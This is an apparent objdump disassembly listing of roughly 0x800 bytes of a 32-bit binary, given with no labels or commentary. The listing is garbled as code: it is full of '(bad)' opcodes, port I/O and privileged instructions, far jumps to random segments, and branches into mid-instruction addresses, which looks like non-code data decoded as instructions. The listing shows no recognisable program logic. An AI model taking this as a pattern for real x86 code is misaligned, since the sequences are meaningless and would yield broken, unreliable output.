  4137e7:	xor    eax,0xf6eea7e2
  4137ec:	push   ds
  4137ed:	mov    ds:0xb2a7a1c4,eax
  4137f2:	mov    ebp,?
  4137f4:	out    0x32,al
  4137f6:	(bad)  
  4137f7:	push   ecx
  4137f8:	inc    edi
  4137f9:	sub    DWORD PTR [edx+0x68],ebx
  4137fc:	pop    esi
  4137fd:	xchg   esi,eax
  4137fe:	sbb    eax,0xedd3fb53
  413803:	outs   dx,DWORD PTR ds:[esi]
  413804:	pop    ebp
  413805:	dec    esp
  413806:	lock fidiv WORD PTR [ebx]
  413809:	xchg   ebx,eax
  41380a:	adc    al,0xd4
  41380c:	pusha  
  41380d:	or     al,BYTE PTR [edx-0x746c3426]
  413813:	nop
  413814:	inc    esi
  413815:	jp     0x41388a
  413817:	xchg   BYTE PTR [ebx+ebp*4],bh
  41381a:	xor    BYTE PTR [ebp+0x13],al
  41381d:	(bad)  [ebx+eiz*8-0x6c2d8c6]
  413824:	push   ebp
  413825:	cmp    DWORD PTR es:[edx-0x42934904],edi
  41382c:	loope  0x4137b7
  41382e:	aam    0x58
  413830:	pop    ss
  413831:	into   
  413832:	sti    
  413833:	ins    BYTE PTR es:[edi],dx
  413834:	daa    
  413835:	and    BYTE PTR [edi],ah
  413837:	nop    esi
  41383a:	cdq    
  41383b:	inc    edi
  41383c:	add    eax,0xa21d837b
  413841:	mov    bl,0x95
  413843:	es push ds
  413845:	inc    BYTE PTR [esi+0x2b]
  413848:	cmovne edi,DWORD PTR [eax]
  41384b:	push   esp
  41384c:	mov    esi,0x82acaf3c
  413851:	out    dx,eax
  413852:	sub    edx,DWORD PTR [ebp+ebp*2-0x4b930014]
  413859:	iret   
  41385a:	das    
  41385b:	out    0x0,al
  41385d:	mov    dl,0x0
  41385f:	iret   
  413860:	loopne 0x41386d
  413862:	test   BYTE PTR [edx+esi*8+0x6c],bh
  413866:	jg     0x41383d
  413868:	out    dx,al
  413869:	mov    WORD PTR [ecx],fs
  41386b:	add    edx,DWORD PTR [ebx-0x6bd2cd86]
  413871:	xchg   edi,eax
  413872:	sbb    eax,0xa3b91d63
  413877:	add    eax,0xd8c5ce0b
  41387c:	jp     0x4138dc
  41387e:	push   ecx
  41387f:	cmp    BYTE PTR [esp+ecx*4+0xf],dh
  413883:	cdq    
  413884:	xchg   ebp,eax
  413885:	scas   al,BYTE PTR es:[edi]
  413886:	pushf  
  413887:	repz jp 0x4138dc
  41388a:	out    dx,al
  41388b:	pop    esp
  41388c:	add    BYTE PTR [ebx+eiz*8+0x4],dl
  413890:	out    dx,al
  413891:	lods   al,BYTE PTR ds:[esi]
  413892:	mov    cl,0xc3
  413894:	or     DWORD PTR [edi+0x2b3ab9d2],ebx
  41389a:	xchg   edx,eax
  41389b:	pop    es
  41389c:	mov    esp,0xbb3a1d11
  4138a2:	ror    BYTE PTR ss:[edi+edx*1-0x4d82308d],0xb0
  4138ab:	mov    ebp,0x6de0b9a6
  4138b0:	push   es
  4138b1:	int3   
  4138b2:	pop    edx
  4138b3:	xchg   esi,eax
  4138b4:	dec    ebx
  4138b5:	out    0x1c,eax
  4138b7:	jl     0x413846
  4138b9:	cmp    ecx,ecx
  4138bb:	fcomp  DWORD PTR [edi-0x1c2afcf9]
  4138c1:	push   ebp
  4138c2:	pop    esi
  4138c3:	or     edx,DWORD PTR [edi-0x5f]
  4138c6:	sbb    bl,BYTE PTR [ebp+0x33]
  4138c9:	mov    esi,0xdbd0e88c
  4138ce:	mov    bh,0xca
  4138d0:	pop    ebx
  4138d1:	cmp    BYTE PTR [ecx+0x4c760b5c],dh
  4138d7:	cmp    al,0x75
  4138d9:	mov    dl,0x7
  4138db:	and    esp,ecx
  4138dd:	retf   
  4138de:	push   0x74
  4138e0:	pop    ecx
  4138e1:	lods   al,BYTE PTR ds:[esi]
  4138e2:	out    dx,eax
  4138e3:	xor    al,0xe3
  4138e5:	retf   
  4138e6:	in     al,0x5d
  4138e8:	les    esp,FWORD PTR [edx+0x1b2ed744]
  4138ee:	(bad)  
  4138f0:	mov    eax,ds:0x30834bd1
  4138f5:	mov    edi,0x15511f87
  4138fa:	xchg   edx,eax
  4138fb:	hlt    
  4138fc:	cmp    dh,al
  4138fe:	icebp  
  4138ff:	push   ds
  413900:	mov    ah,0xc1
  413902:	mov    al,0x18
  413904:	sti    
  413905:	mov    esp,ss
  413907:	popa   
  413908:	sbb    bh,BYTE PTR [eax+ecx*4-0x1a]
  41390c:	test   DWORD PTR [edx],0x9b909a06
  413912:	outs   dx,BYTE PTR ds:[esi]
  413913:	jnp    0x413986
  413915:	jecxz  0x41394b
  413917:	retf   
  413918:	or     eax,0xf6c53cee
  41391d:	or     ch,bl
  41391f:	rol    BYTE PTR [edi],0xb0
  413922:	jnp    0x4138cf
  413924:	push   esi
  413925:	imul   ebx,DWORD PTR [eax-0x3c],0x6c
  413929:	sbb    al,0x56
  41392b:	inc    edx
  41392c:	arpl   WORD PTR [edx-0x4c],bp
  41392f:	mov    ds:0xc9c3751c,al
  413934:	fsubr  DWORD PTR [edx]
  413936:	(bad)  
  413937:	sbb    al,0x4e
  413939:	out    dx,al
  41393a:	or     DWORD PTR [edx],esi
  41393c:	jae    0x4139a8
  41393e:	das    
  41393f:	adc    DWORD PTR [ecx+0x64],esp
  413942:	jo     0x4139b5
  413944:	lods   al,BYTE PTR ds:[esi]
  413945:	mov    edi,0xf74c8b76
  41394a:	test   BYTE PTR [edi+0x22],ch
  41394d:	cwde   
  41394e:	scas   eax,DWORD PTR es:[edi]
  41394f:	pop    eax
  413950:	push   ebp
  413951:	xor    bl,BYTE PTR [esi+ecx*2-0x161444ed]
  413958:	mov    ecx,0xce82fe2c
  41395d:	shl    BYTE PTR [edx-0x67d34f6],1
  413963:	ins    BYTE PTR es:[edi],dx
  413964:	cmp    ah,BYTE PTR [ebx+0x7b]
  413967:	cs sbb eax,0x2f4cfd81
  41396d:	lods   al,BYTE PTR ds:[esi]
  41396e:	jnp    0x41390f
  413970:	aad    0x98
  413972:	dec    ebp
  413973:	jmp    DWORD PTR [edx]
  413975:	jge    0x413904
  413977:	repnz push esi
  413979:	pushf  
  41397a:	inc    esi
  41397b:	int    0x78
  41397d:	sub    ch,ah
  41397f:	je     0x4139ac
  413981:	int    0x36
  413983:	dec    edx
  413984:	sbb    al,0xea
  413986:	imul   eax,DWORD PTR [eax+ebx*2-0x41],0x5f
  41398b:	xor    ecx,esp
  41398d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41398e:	sub    BYTE PTR [ecx],cl
  413990:	jmp    0x5ee04614
  413995:	neg    BYTE PTR [ecx+0x78]
  413998:	cmp    DWORD PTR [edx-0x3c],0x2f
  41399c:	mul    DWORD PTR [ecx-0x51e27f1d]
  4139a2:	jmp    0x97f60b61
  4139a7:	cmp    BYTE PTR [esi+0x2f],0x81
  4139ab:	xor    esp,DWORD PTR [ecx]
  4139ad:	ret    
  4139ae:	xor    DWORD PTR [ecx-0x75],edi
  4139b1:	mov    eax,0xa11357b
  4139b6:	mov    al,ds:0xdd78b7b4
  4139bb:	and    esp,DWORD PTR [edx-0x41]
  4139be:	adc    BYTE PTR ds:0xa4933678,bl
  4139c4:	call   0x4e98bee1
  4139c9:	scas   eax,DWORD PTR es:[edi]
  4139ca:	push   ss
  4139cb:	push   ebp
  4139cc:	cmp    BYTE PTR [ebp+0x7e],bh
  4139cf:	jl     0x413957
  4139d1:	mov    esp,0xb638480
  4139d6:	aas    
  4139d7:	ret    
  4139d8:	or     BYTE PTR ss:[edx],bl
  4139db:	pop    esi
  4139dc:	xchg   BYTE PTR [edx],bl
  4139de:	sbb    al,BYTE PTR [esp+ebp*1-0x9]
  4139e2:	sub    dh,BYTE PTR [edx+0x7a6e89ce]
  4139e8:	xlat   BYTE PTR ds:[ebx]
  4139e9:	dec    ebp
  4139ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139eb:	arpl   WORD PTR [ebx-0x30],ax
  4139ee:	imul   ecx,DWORD PTR [ebx+0x35],0xa876cd4
  4139f5:	(bad)  
  4139f6:	ds test al,0xf
  4139f9:	nop
  4139fa:	das    
  4139fb:	or     edi,esi
  4139fd:	dec    esi
  4139fe:	xchg   edi,eax
  4139ff:	dec    ebp
  413a00:	and    ah,BYTE PTR [ebx-0x30]
  413a03:	cwde   
  413a04:	push   ecx
  413a05:	push   cs
  413a06:	dec    ebp
  413a07:	mov    eax,0xbcd1538a
  413a0c:	jbe    0x413995
  413a0e:	stos   DWORD PTR es:[edi],eax
  413a0f:	in     eax,0xf2
  413a11:	mov    eax,ds:0x127d9476
  413a16:	add    bl,BYTE PTR [ebp+0x730e34cf]
  413a1c:	xchg   edx,eax
  413a1d:	(bad)  [edi+0x1308535]
  413a23:	das    
  413a24:	sbb    eax,0x1fbc14b0
  413a29:	pop    ecx
  413a2a:	mov    dh,0x64
  413a2c:	mov    ecx,0x3912c368
  413a31:	aad    0x44
  413a33:	push   es
  413a34:	sub    dl,BYTE PTR [ecx-0x6b]
  413a37:	xor    eax,0xf072119d
  413a3c:	inc    ebx
  413a3d:	mov    esi,DWORD PTR [ebp+0x44]
  413a40:	fcmovne st,st(3)
  413a42:	je     0x4139fc
  413a44:	mov    eax,ds:0x66a58320
  413a49:	cli    
  413a4a:	outs   dx,DWORD PTR ds:[esi]
  413a4b:	mov    edx,DWORD PTR [edi]
  413a4d:	cmc    
  413a4e:	jmp    0xd5ec5041
  413a53:	pop    ds
  413a54:	push   eax
  413a55:	out    dx,eax
  413a56:	bound  ebp,QWORD PTR [esi]
  413a58:	aam    0x17
  413a5a:	or     BYTE PTR [edx+ebp*1-0x73],dl
  413a5e:	push   esi
  413a5f:	sub    ebx,0x25db742f
  413a65:	call   0xedaa:0x90b67302
  413a6c:	xor    edi,DWORD PTR [ebx]
  413a6e:	ret    
  413a6f:	sub    eax,0x691d4afb
  413a74:	mov    ecx,ds
  413a76:	mov    eax,ds:0xeb95d593
  413a7b:	mov    edi,0xe060d2b0
  413a80:	push   eax
  413a81:	sar    DWORD PTR [edi-0x4b],0x53
  413a85:	cmp    eax,0xd441b173
  413a8a:	mov    ah,0x2b
  413a8c:	daa    
  413a8d:	shl    DWORD PTR cs:[eax-0x2bad35e8],0x80
  413a95:	cmp    dh,BYTE PTR [ecx-0x6f48ac66]
  413a9b:	inc    BYTE PTR [ebx]
  413a9d:	inc    ecx
  413a9e:	cwde   
  413a9f:	mov    ebx,0xe79eaf2a
  413aa4:	ret    0x4bcb
  413aa7:	inc    edi
  413aa8:	mov    ecx,DWORD PTR [edx-0x4]
  413aab:	bswap  ecx
  413aad:	sub    al,0xa3
  413aaf:	xor    al,0xb3
  413ab1:	outs   dx,DWORD PTR ds:[esi]
  413ab2:	mov    edx,0xe4a43bbb
  413ab7:	imul   ebp,DWORD PTR [edx+0x3e],0x2aa985c7
  413abe:	pop    edx
  413abf:	aaa    
  413ac0:	pop    ds
  413ac1:	fimul  WORD PTR [esi+eax*8]
  413ac4:	cmp    cl,BYTE PTR [edi+0x26]
  413ac7:	mov    esi,0x8ee964f6
  413acc:	xchg   esi,eax
  413acd:	das    
  413ace:	mov    esp,0x64a9d791
  413ad3:	test   BYTE PTR ss:[ecx-0x12],0x5f
  413ad8:	rol    BYTE PTR [edx+0x52dc65d7],0x5f
  413adf:	test   BYTE PTR [edx+0x7b88b615],al
  413ae5:	cmp    DWORD PTR [eax-0x738e94c5],ecx
  413aeb:	jne    0x413a9a
  413aed:	out    0x71,eax
  413aef:	push   0x10f64702
  413af4:	adc    ebx,DWORD PTR [esi-0x2423ecd8]
  413afa:	mov    ah,0x4e
  413afc:	fs pop eax
  413afe:	sub    DWORD PTR [eax-0x4f737004],0xffffffb0
  413b05:	cwde   
  413b06:	fnstenv es:[ebp-0xa]
  413b0a:	jns    0x413b89
  413b0c:	adc    dl,ch
  413b0e:	mov    cl,0xcc
  413b10:	xor    BYTE PTR [eax],bl
  413b12:	outs   dx,BYTE PTR gs:[esi]
  413b14:	pop    esp
  413b15:	mov    ebx,0x46d67211
  413b1a:	xlat   BYTE PTR ds:[ebx]
  413b1b:	(bad)  
  413b1c:	cld    
  413b1d:	out    dx,eax
  413b1e:	fild   DWORD PTR [edi+0x695a4dba]
  413b24:	aas    
  413b25:	es repnz and edi,DWORD PTR gs:[ecx-0x3bca2eb0]
  413b2e:	dec    eax
  413b2f:	push   ebx
  413b30:	shl    BYTE PTR [eax+0x1d4a24ac],cl
  413b36:	dec    eax
  413b37:	xor    al,BYTE PTR [edx+ebx*8]
  413b3a:	adc    al,0x90
  413b3c:	and    eax,0x5d8eeab0
  413b42:	test   DWORD PTR [edi+0xdd2ec0],ebx
  413b48:	xchg   DWORD PTR [esp+ecx*8-0x33ca02b0],esp
  413b4f:	inc    esp
  413b50:	mov    ebp,0x296d977c
  413b55:	xchg   esp,eax
  413b56:	repz sbb eax,0x4e1ddbbd
  413b5c:	das    
  413b5d:	jecxz  0x413b5d
  413b5f:	push   esi
  413b60:	cmp    al,0xc4
  413b62:	jmp    0x4b2f4f0f
  413b67:	jecxz  0x413af4
  413b69:	cmp    DWORD PTR [ebx+0x2b6392e0],eax
  413b6f:	xor    esp,DWORD PTR [esi]
  413b71:	push   ds
  413b72:	xchg   ebp,eax
  413b73:	loope  0x413b28
  413b75:	stc    
  413b76:	and    ah,ah
  413b78:	jl     0x413bde
  413b7a:	imul   ebx,ebp,0xda4936cf
  413b80:	mov    eax,0xac1511df
  413b85:	sbb    DWORD PTR es:[ebx],ecx
  413b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b89:	jp     0x413b7b
  413b8b:	push   0xffffff9d
  413b8d:	mov    ah,0x8d
  413b8f:	xchg   esp,eax
  413b90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b91:	outs   dx,DWORD PTR ds:[esi]
  413b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b93:	sbb    DWORD PTR ds:0x1c754a03,0x35
  413b9a:	add    eax,0xbc02a0f5
  413b9f:	leave  
  413ba0:	mov    bh,dh
  413ba2:	std    
  413ba3:	popf   
  413ba4:	rol    DWORD PTR [ebx+eiz*2+0x1c156c07],cl
  413bab:	jmp    0x6720:0x19a04a1d
  413bb2:	pushf  
  413bb3:	hlt    
  413bb4:	rcl    BYTE PTR [esi+0x3579e18c],cl
  413bba:	ds pop ebp
  413bbc:	jle    0x413c3d
  413bbe:	dec    ebx
  413bbf:	(bad)  
  413bc0:	out    dx,eax
  413bc1:	xabort 0xe3
  413bc4:	fbstp  TBYTE PTR [edx-0x75]
  413bc7:	(bad)  
  413bc8:	mov    DWORD PTR [eax+eiz*1+0x51f9e114],eax
  413bcf:	mov    ds,WORD PTR [eax-0x14dfbe00]
  413bd5:	cmp    ah,al
  413bd7:	jb     0x413c2f
  413bd9:	xor    dh,BYTE PTR [esi+0xbee2f2b]
  413bdf:	popa   
  413be0:	adc    eax,0xdd6c352d
  413be5:	int    0x67
  413be7:	inc    ebp
  413be8:	outs   dx,DWORD PTR ds:[esi]
  413be9:	sahf   
  413bea:	nop
  413beb:	or     edi,DWORD PTR [esi+0x1a40deef]
  413bf1:	cwde   
  413bf2:	add    bh,BYTE PTR [esi+0xedda4ad]
  413bf8:	(bad)  
  413bf9:	in     al,0xf8
  413bfb:	inc    edi
  413bfc:	out    0x6d,eax
  413bfe:	xchg   esp,eax
  413bff:	les    ebx,FWORD PTR [ebx-0x7c8f144a]
  413c05:	xor    al,0x5
  413c07:	push   ss
  413c08:	loopne 0x413c29
  413c0a:	aas    
  413c0b:	loop   0x413c87
  413c0d:	sahf   
  413c0e:	push   es
  413c0f:	jle    0x413c3a
  413c11:	sub    BYTE PTR [ecx+edx*8],dl
  413c14:	retf   0xd5f8
  413c17:	dec    esp
  413c18:	dec    ebp
  413c19:	fsubr  QWORD PTR [ebp+0x57c9dae5]
  413c1f:	(bad)  
  413c20:	or     al,0x60
  413c22:	add    esp,eax
  413c24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c25:	pop    ebp
  413c26:	lea    ebp,[ebx+0x58bb01b6]
  413c2c:	xor    DWORD PTR [ebx],eax
  413c2e:	push   esi
  413c2f:	pavgb  mm2,QWORD PTR [eax+0x1d]
  413c33:	ins    DWORD PTR es:[edi],dx
  413c34:	cmp    DWORD PTR [ecx+edi*2-0x7a],0x7c
  413c39:	loope  0x413ca5
  413c3b:	xchg   esi,eax
  413c3c:	cwde   
  413c3d:	jle    0x413c9c
  413c3f:	ffree  st(1)
  413c41:	nop
  413c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c43:	add    cl,bh
  413c45:	xor    DWORD PTR [ebx+0x78],ebx
  413c48:	jb     0x413be1
  413c4a:	xor    eax,0xff55ba99
  413c4f:	sub    bl,BYTE PTR [edi+0x67]
  413c52:	fwait
  413c53:	mov    ebx,0x41626702
  413c58:	cmp    ebp,esi
  413c5a:	out    dx,al
  413c5b:	xchg   ecx,eax
  413c5c:	dec    edi
  413c5d:	jl     0x413cc4
  413c5f:	xor    DWORD PTR [esi+0x18],edx
  413c62:	pushf  
  413c63:	shl    BYTE PTR [edx+0x6293a025],1
  413c69:	outs   dx,BYTE PTR ds:[esi]
  413c6a:	xchg   BYTE PTR [ebx-0x2c],ch
  413c6d:	test   DWORD PTR [edi-0x5c97893],esi
  413c73:	cld    
  413c74:	jecxz  0x413c72
  413c76:	stos   DWORD PTR es:[edi],eax
  413c77:	inc    esi
  413c78:	xchg   ebp,eax
  413c79:	jne    0x413c36
  413c7b:	loopne 0x413c17
  413c7d:	cmp    BYTE PTR [ebp+0x27],ch
  413c80:	dec    eax
  413c81:	lods   al,BYTE PTR ds:[esi]
  413c82:	inc    DWORD PTR [esi+ebx*1-0x21]
  413c86:	repnz rcl BYTE PTR gs:[ecx+0x3fd54940],cl
  413c8e:	call   0x2dc6:0xf144e56b
  413c95:	adc    BYTE PTR [ebx],cl
  413c97:	out    0x42,eax
  413c99:	ror    BYTE PTR [edi+0x3a],0x1f
  413c9d:	inc    ecx
  413c9e:	pop    edi
  413c9f:	out    dx,al
  413ca0:	dec    ebx
  413ca1:	es push ebp
  413ca3:	(bad)  
  413ca4:	or     BYTE PTR [edi+0x6d],bh
  413ca7:	cmp    DWORD PTR [ebx+0x43],edx
  413caa:	stc    
  413cab:	xchg   esp,eax
  413cac:	(bad)  [edx-0x52e1a092]
  413cb2:	in     eax,dx
  413cb3:	mov    eax,0x5d35ec6e
  413cb8:	int    0x91
  413cba:	xor    edx,DWORD PTR [esi]
  413cbc:	push   es
  413cbd:	mov    ds:0x3abc5bee,eax
  413cc2:	add    ebp,eax
  413cc4:	xor    ah,BYTE PTR [eax]
  413cc6:	mov    edx,0x54eb2900
  413ccb:	and    DWORD PTR [esi+0x2be21236],edi
  413cd1:	and    eax,0x7d08fa31
  413cd6:	fisttp DWORD PTR [bp+si+0x8]
  413cda:	in     eax,dx
  413cdb:	fwait
  413cdc:	mov    esp,0x183eda4c
  413ce1:	ss add eax,0xb747f1b1
  413ce7:	das    
  413ce8:	jo     0x413cb9
  413cea:	call   0x774b26df
  413cef:	aad    0x30
  413cf1:	out    dx,eax
  413cf2:	into   
  413cf3:	jnp    0x413c81
  413cf5:	(bad)  
  413cf6:	xlat   BYTE PTR ds:[ebx]
  413cf7:	mov    DWORD PTR [esi],ebp
  413cf9:	ror    DWORD PTR [edi],cl
  413cfb:	and    eax,0x53a66092
  413d00:	es test DWORD PTR fs:0x7ebf4b52,esi
  413d08:	xchg   edi,eax
  413d09:	je     0x413cd5
  413d0b:	in     al,dx
  413d0c:	ins    DWORD PTR es:[edi],dx
  413d0d:	neg    ch
  413d0f:	es or  al,0xa5
  413d12:	outs   dx,BYTE PTR ds:[esi]
  413d13:	ss jle 0x413cdf
  413d16:	test   eax,0xdc4660de
  413d1b:	ss mov bl,0xcd
  413d1e:	mov    dl,0xd5
  413d20:	mov    ds:0xd50170f3,al
  413d25:	addr16 jge 0x413d09
  413d28:	in     eax,dx
  413d29:	popa   
  413d2a:	and    BYTE PTR ds:0xed396a1d,0x72
  413d31:	clc    
  413d32:	add    BYTE PTR [ebp-0x65],al
  413d35:	jl     0x413d31
  413d37:	jge    0x413d70
  413d39:	xor    esp,esi
  413d3b:	jmp    0x413d97
  413d3d:	push   esp
  413d3e:	stc    
  413d3f:	and    eax,0x5c6810ef
  413d44:	aaa    
  413d45:	add    DWORD PTR [ecx],0x1d
  413d48:	das    
  413d49:	mov    dh,0x96
  413d4b:	or     al,BYTE PTR [esi-0x5e]
  413d4e:	jl     0x413d8c
  413d50:	retf   0x796e
  413d53:	ins    DWORD PTR es:[edi],dx
  413d54:	das    
  413d55:	rcr    ch,cl
  413d57:	xor    al,0xb3
  413d59:	mov    eax,ds:0x2f9918c3
  413d5e:	xchg   esp,eax
  413d5f:	std    
  413d60:	add    cl,bh
  413d62:	jecxz  0x413cea
  413d64:	aad    0x52
  413d66:	popa   
  413d67:	mov    ebp,0xda98944d
  413d6c:	cs xchg ebx,esi
  413d6f:	jecxz  0x413d85
  413d71:	xchg   esp,eax
  413d72:	retf   
  413d73:	mov    esp,0xea3829b4
  413d78:	rcr    DWORD PTR [edi-0x6813c13f],0x6d
  413d7f:	xor    cl,al
  413d81:	sub    al,BYTE PTR [esi-0x6e]
  413d84:	(bad)  
  413d85:	ror    BYTE PTR [eax+0x3fe2d2cf],cl
  413d8b:	mov    ch,0xe1
  413d8d:	js     0x413de2
  413d8f:	fucom  st(4)
  413d91:	mov    ebx,0xb0b4fa51
  413d96:	(bad)  
  413d97:	enter  0xa2ae,0xcf
  413d9b:	icebp  
  413d9c:	xchg   DWORD PTR [esi-0x25],ebx
  413d9f:	adc    esi,DWORD PTR [ebx]
  413da1:	mov    DWORD PTR [edi+0x76ac79a7],eax
  413da7:	adc    eax,0x87736c99
  413dac:	adc    ebx,eax
  413dae:	repnz scas al,BYTE PTR es:[edi]
  413db0:	pop    ss
  413db1:	retf   0xb82f
  413db4:	mov    edi,0x88599a58
  413db9:	xor    BYTE PTR ss:[eax],0xd4
  413dbd:	sbb    BYTE PTR [eax+0x711460bf],ah
  413dc3:	iret   
  413dc4:	ins    DWORD PTR es:[edi],dx
  413dc5:	pop    ebp
  413dc6:	int    0xa6
  413dc8:	fimul  DWORD PTR [edx]
  413dca:	cmc    
  413dcb:	cld    
  413dcc:	jmp    0xe51ea61b
  413dd1:	daa    
  413dd2:	mov    esp,0xc25ee377
  413dd7:	cld    
  413dd8:	sbb    bl,BYTE PTR [eax+0x679ed48c]
  413dde:	pop    ebp
  413ddf:	sahf   
  413de0:	(bad)  
  413de2:	lock jne 0x413e5a
  413de5:	dec    edx
  413de6:	adc    dh,BYTE PTR [esi-0x5ae2d1d9]
  413dec:	mov    ecx,0xb6fdf406
  413df1:	sbb    al,BYTE PTR [ebx]
  413df3:	pop    ecx
  413df4:	lods   eax,DWORD PTR ds:[esi]
  413df5:	(bad)  
  413df6:	sahf   
  413df7:	sbb    BYTE PTR [eiz*2-0x70be5ac3],ah
  413dfe:	icebp  
  413dff:	mov    ah,0xaf
  413e01:	and    ah,BYTE PTR [esi-0x30]
  413e04:	leave  
  413e05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e06:	mov    bl,0xf3
  413e08:	(bad)  
  413e09:	push   cs
  413e0a:	or     ebp,ebx
  413e0c:	jae    0x413e46
  413e0e:	mov    ebp,0xc1fe2bc1
  413e13:	add    al,0xf6
  413e15:	dec    eax
  413e16:	addr16 fscale 
  413e19:	inc    ebx
  413e1a:	std    
  413e1b:	jmp    0xd09fc29a
  413e20:	pop    edi
  413e21:	sbb    ecx,edi
  413e23:	inc    esi
  413e24:	inc    ecx
  413e25:	lea    ebp,[edx-0x1915aec5]
  413e2b:	cli    
  413e2c:	loope  0x413db8
  413e2e:	mov    cs:0xc52ed907,eax
  413e34:	adc    bh,ah
  413e36:	mov    edx,0x824cbbe9
  413e3b:	sbb    al,0x2c
  413e3d:	adc    edi,DWORD PTR [eax-0x5e]
  413e40:	rcl    BYTE PTR [ebx],0x4
  413e43:	xor    al,0x25
  413e45:	pop    ecx
  413e46:	add    DWORD PTR [ebx-0x80],edi
  413e49:	mov    esp,0x978f4e88
  413e4e:	mov    WORD PTR [ecx-0x60],es
  413e51:	mov    al,ds:0xf3269c8d
  413e56:	mov    DWORD PTR [edi+0x24dcb60b],edi
  413e5c:	(bad)  
  413e5d:	adc    ebp,DWORD PTR [edi-0x6ff323d3]
  413e63:	lds    ecx,FWORD PTR [ebx+0x53b4b6cc]
  413e69:	arpl   WORD PTR [edx+0x9],cx
  413e6c:	bound  ecx,QWORD PTR [ebx+0x4a]
  413e6f:	adc    ecx,edx
  413e71:	xchg   edx,eax
  413e72:	mov    ds:0xe1ad116c,eax
  413e77:	fwait
  413e78:	cli    
  413e79:	(bad)  
  413e7a:	cli    
  413e7b:	fcomp  DWORD PTR [edx-0x6f948090]
  413e81:	dec    edi
  413e82:	(bad)  
  413e83:	sbb    BYTE PTR [ecx-0x6b7865c0],dl
  413e89:	imul   edi,DWORD PTR [esi],0xff73592a
  413e8f:	or     al,0xeb
  413e91:	sbb    al,BYTE PTR [edi+0x4f]
  413e94:	xor    eax,0x2b6a2e54
  413e99:	mov    edx,DWORD PTR [esi-0x46]
  413e9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e9d:	lock outs dx,DWORD PTR ds:[esi]
  413e9f:	mov    dh,0xff
  413ea1:	jbe    0x413ebd
  413ea3:	or     ah,BYTE PTR [eax+0x24]
  413ea6:	addr16 cmp al,0x2a
  413ea9:	push   edx
  413eaa:	mov    bh,0xac
  413eac:	or     DWORD PTR [edi],ebx
  413eae:	fsub   st,st(7)
  413eb0:	mov    ch,0x9f
  413eb2:	push   ecx
  413eb3:	clc    
  413eb4:	sub    DWORD PTR [esi+0x3972c13b],edx
  413eba:	retf   0x2238
  413ebd:	jmp    0x413e87
  413ebf:	pop    edx
  413ec0:	shl    DWORD PTR [eax],0x98
  413ec3:	int3   
  413ec4:	push   ebx
  413ec5:	mov    ds:0x69c2c991,eax
  413eca:	mov    edx,DWORD PTR [ecx-0x7c]
  413ecd:	outs   dx,DWORD PTR ds:[esi]
  413ece:	rol    DWORD PTR [esi-0xf],1
  413ed1:	mov    esi,0x9d270783
  413ed6:	pop    ss
  413ed7:	test   edi,eax
  413ed9:	push   ds
  413eda:	or     al,0x97
  413edc:	test   eax,0x998f8eb9
  413ee1:	fucomp st(4)
  413ee3:	sahf   
  413ee4:	in     eax,0xea
  413ee6:	push   edx
  413ee7:	xlat   BYTE PTR ds:[ebx]
  413ee8:	fdivr  DWORD PTR [eax+0x21]
  413eeb:	test   DWORD PTR [edi-0x35],ebx
  413eee:	fisub  WORD PTR [eax-0x18e1276b]
  413ef4:	push   ecx
  413ef5:	imul   edx,DWORD PTR [edx-0x8c8f4b5],0x2dff7319
  413eff:	xchg   DWORD PTR [ebx-0x6252b634],edi
  413f05:	inc    eax
  413f06:	xor    al,ch
  413f08:	jnp    0x413f5c
  413f0a:	jp     0x413f62
  413f0c:	jmp    0x95610dd5
  413f11:	add    esp,DWORD PTR ds:0x872cab56
  413f17:	add    al,0xe2
  413f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f1a:	pop    edx
  413f1b:	dec    eax
  413f1c:	sahf   
  413f1d:	das    
  413f1e:	add    BYTE PTR [esp+ecx*4],bl
  413f21:	outs   dx,DWORD PTR ds:[esi]
  413f22:	imul   eax,DWORD PTR [ecx],0x53
  413f25:	inc    ebp
  413f26:	mov    WORD PTR [edi],gs
  413f28:	jmp    0xc043:0xdbdc7d6a
  413f2f:	mov    DWORD PTR [ecx],esi
  413f31:	mov    ch,0xe7
  413f33:	(bad)  
  413f34:	pop    esp
  413f35:	xchg   edi,eax
  413f36:	call   0xc196:0xfd8077d
  413f3d:	mov    al,ds:0x4e2e2200
  413f42:	jmp    0xdc6f46a9
  413f47:	mov    ch,0x49
  413f49:	mov    edx,DWORD PTR [edi-0x16e50622]
  413f4f:	aas    
  413f50:	sbb    DWORD PTR [edi-0x2c],ebp
  413f53:	pop    esp
  413f54:	dec    edi
  413f55:	jns    0x413f24
  413f57:	adc    DWORD PTR [ecx],esi
  413f59:	and    eax,0x602f84db
  413f5e:	call   0xd647eb5
  413f63:	mov    al,ds:0x2b75e8e7
  413f68:	fmul   st(1),st
  413f6a:	and    DWORD PTR [esi+eiz*4],ecx
  413f6d:	jl     0x413f13
  413f6f:	xchg   DWORD PTR [ecx+0x79beadfd],ecx
  413f75:	dec    ebx
  413f76:	xor    eax,0x7f958478
  413f7b:	add    cl,BYTE PTR [ebx]
  413f7d:	xlat   BYTE PTR ds:[ebx]
  413f7e:	and    al,0x42
  413f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f81:	push   ebx
  413f82:	enter  0xbbee,0x7e
  413f86:	inc    ecx
  413f87:	xor    eax,0x83533ca9
  413f8c:	ret    
  413f8d:	cmp    DWORD PTR [ebx+edi*2+0x18],0x29
  413f92:	shr    edx,1
  413f94:	mov    ah,0x6
  413f96:	jl     0x413f1b
  413f98:	inc    ecx
  413f99:	push   edi
  413f9a:	jg     0x413f31
  413f9c:	push   esp
  413f9d:	push   ss
  413f9e:	sub    eax,eax
  413fa0:	sub    edx,eax
  413fa2:	fild   QWORD PTR [edi-0x551b9933]
  413fa8:	xor    BYTE PTR [ebp+0xb0f2db8],dl
  413fae:	pop    eax
  413faf:	cld    
  413fb0:	lock sbb ah,0x50
  413fb4:	neg    dl
  413fb6:	ret    
  413fb7:	mov    edi,0x91de6f27
  413fbc:	push   0x3ce0afd5
